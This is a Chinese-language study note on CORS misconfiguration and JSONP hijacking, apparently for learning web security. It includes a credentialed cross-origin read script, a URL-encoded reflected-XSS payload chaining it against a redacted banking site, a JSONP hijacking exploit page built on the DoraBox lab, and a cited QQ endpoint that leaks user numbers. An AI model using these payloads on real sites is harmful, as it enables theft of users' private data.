<a name="TsgCS"></a>
# 前端跨域漏洞
<a name="QoI4Q"></a>
## CORS
漏洞原因<br /> <br />由于配置不当，服务器并没有对Origin源进行一个严格的判断，从而造成跨域问题。<br />只要关注Origin即可。当我们把Origin设置为testcors.com时，返回包的Access-Control-Allow-Origin也为testcors.com,也就是testcors.com可以跨域获取aufeng.com的资源。从而产生了CORS配置不当的漏洞<br /> <br />（请求包的origin和响应包的access-allow-Origin）

一般xss+cors可以形成组合拳打高危漏洞<br />参考：<br />[https://www.freebuf.com/articles/web/204023.html](https://www.freebuf.com/articles/web/204023.html)<br /> <br />固定payload
```c
function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {
if (this.status == 200) {
alert(this.responseText);
document.getElementById("demo").innerHTML = this.responseText;
}
};
xhttp.open("GET", "https://www.redacted.com/api/return", true);
xhttp.withCredentials = true;
xhttp.send();
}
cors();
```
假设[https://banques.redacted.com/choice-quiz?form_banque=](https://banques.redacted.com/choice-quiz?form_banque=)存在反射xss

[https://www.redacted.com/api/return](https://www.redacted.com/api/return) 存在cors跨域漏洞。<br />就像这样：
```
https://banques.redacted.com/choice-quiz?form_banque="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>&form_cartes=73&iframestat=1
```
 
<a name="dRQ11"></a>
## jsonp跨域
Jsonp跨域漏洞<br />为什么要用到jsonp跨域？<br />**同源策略**：协议、域名、端口都相同，是一种安全策略，不同源的客户端脚本在没有明确授权的情况下，不能读取对方资源。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339347380-3e099698-004b-4e9e-aa8b-36ca9c4ba132.png#height=195&id=eSHEV&originHeight=210&originWidth=804&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> <br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339347536-773cc7e5-edef-45e9-8cab-95776d0ae049.png#height=218&id=awnYO&originHeight=218&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=594)<br />如何解决跨域？目前掌握的有两种手段<br />（1）JSONP方式<br />（2）跨域资源共享（CORS），即添加响应头<br /> <br />Json一般长这样<br />{"name":"aufeng", "blog":"https://blog.csdn.net/weixin_41598660"}<br /> <br />它是一个非官方的协议，它允许在服务器端集成Script tags返回至客户端，通过javascript callback的形式实现跨域访问（这仅仅是JSONP简单的实现形式）。JSONP是一种非正式传输协议，该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。<br /> <br />例如<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339347665-c631ccc7-3be1-46b7-92bc-e1b8d36ce4ad.png#height=58&id=XtdOn&originHeight=89&originWidth=1145&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br />其中callback接口或许能插入xss的payload<br /> <br />Jsonp劫持漏洞复现<br />思维导图（个人理解<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339347892-9bd56416-210c-433b-b00d-011f2030dcfe.png#height=285&id=gWCCD&originHeight=285&originWidth=501&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=501)<br />Phpstudy并且设置好网站域名攻击者为aufeng.com，漏洞页面为dorabox.com<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348076-85567133-ecf3-4f80-b2e3-bc90e83bf51d.png#height=491&id=feZlg&originHeight=491&originWidth=533&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=533)<br />搭建漏洞环境 dorabox，[https://github.com/Acmesec/DoraBox](https://github.com/Acmesec/DoraBox)<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348242-0674d516-1a08-47a0-b890-d21f78168989.png#height=248&id=rQnWJ&originHeight=419&originWidth=1259&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br />Json劫持漏洞源码<br /><?php<br />       include "../class/function.class.php";<br />       $reqMethod = "GET";<br />       $reqValue = "callback";<br />       $p = new Func($reqMethod, $reqValue);<br />       $info = array('username' => 'Vulkey_Chen', 'mobilephone' => '13188888888', 'email' => 'admin@gh0st.cn', 'address' => '中华人民共和国', 'sex' => 'Cool Man');<br />       if(!@$_GET['callback']){<br />              echo $p -> con_function('json_encode',$info);<br />       }else{<br />              $callback = htmlspecialchars($_GET['callback']);<br />              echo "{$callback}(" . $p -> con_function('json_encode',$info) . ")";<br />       }<br />?><br />漏洞页面<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348384-2f2a4718-1ac4-42b3-aace-f6f3b38ea66b.png#height=79&id=j54zS&originHeight=120&originWidth=1137&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br />编写exp<br /><html><br /><head><br /><meta charset="utf-8"><br /><title>JSONP劫持测试</title><br /></head><br /><body><br /><script type="text/javascript"><br />function vulkey(data){alert(JSON.stringify(data));}</script><br /> <br /><script src="http://www.DoraBox.com/csrf/jsonp.php?callback=vulkey"></script><br /></body><br /></html><br /> <br /> <br />Exp劫持url为：[http://www.aufeng.com/json2.html](http://www.aufeng.com/json2.html) ，假设受害者点击该页面，攻击者将会获取受害者敏感信息。<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348504-ba23659e-b20d-43b0-afaa-ae998abe32a0.png#height=320&id=Wg7HT&originHeight=518&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> <br />分析：<br />但是如上的漏洞复现为什么成功？是因为漏洞服务器并没有对攻击者构造的页面请求进行referer的验证<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348630-57edfa01-1b45-427e-a378-1f76864fef31.png#height=146&id=vPJQM&originHeight=159&originWidth=811&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> <br />例如上面攻击的请求包里面，referer值是攻击者的构造页面，但是漏洞服务器并没有对来源<br />的页面进行一个验证，导致了攻击者能获取到受害者的敏感信息。<br />（有的返回json数据会验证referer是不是从自己规定的域过来的）<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348749-e5026629-9581-4e16-9879-31cd19bc2667.png#height=133&id=CViB4&originHeight=220&originWidth=1236&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> <br /> <br />常见json劫持exp<br />[https://www.cnblogs.com/xiaozi/p/9963523.html](https://www.cnblogs.com/xiaozi/p/9963523.html)<br />参考文章<br />[https://www.cnblogs.com/xiaoan0705/p/8625454.html](https://www.cnblogs.com/xiaoan0705/p/8625454.html)<br /> <br />乌云案例<br />1<br />登录QQ，访问[http://dir.minigame.qq.com/cgi-bin/yxs/GetYxsRegTime?callback=callback&dstuin=](http://dir.minigame.qq.com/cgi-bin/yxs/GetYxsRegTime?callback=callback&dstuin=)泄露用户QQ<br />![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339348974-ca5cd50b-abb9-4b8d-b906-840fdb6a1af2.png#height=83&id=odJHI&originHeight=124&originWidth=1113&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> <br /> <br />2![](https://cdn.nlark.com/yuque/0/2020/png/1345801/1589339349134-5f1bf494-a0bc-4479-8fd5-7108531990de.png#height=332&id=APxDv&originHeight=531&originWidth=1194&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=746)<br /> 
